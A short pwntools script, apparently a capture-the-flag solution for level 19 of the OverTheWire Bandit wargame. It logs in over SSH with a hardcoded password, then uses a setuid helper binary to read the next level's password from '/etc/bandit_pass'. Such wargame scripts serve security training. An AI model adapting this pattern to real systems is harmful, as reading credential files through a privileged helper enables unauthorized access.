#!/usr/bin/env python
from pwn import *

log.info('overthewire.org - bandit19 exploit by SKane')

shell = ssh('bandit19', 'bandit.labs.overthewire.org', password='IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x', port=2220)

sh = shell.run('sh')

sh.sendline('./bandit20-do cat /etc/bandit_pass/bandit20')

log.success("Password for bandit20: " + sh.recvline())
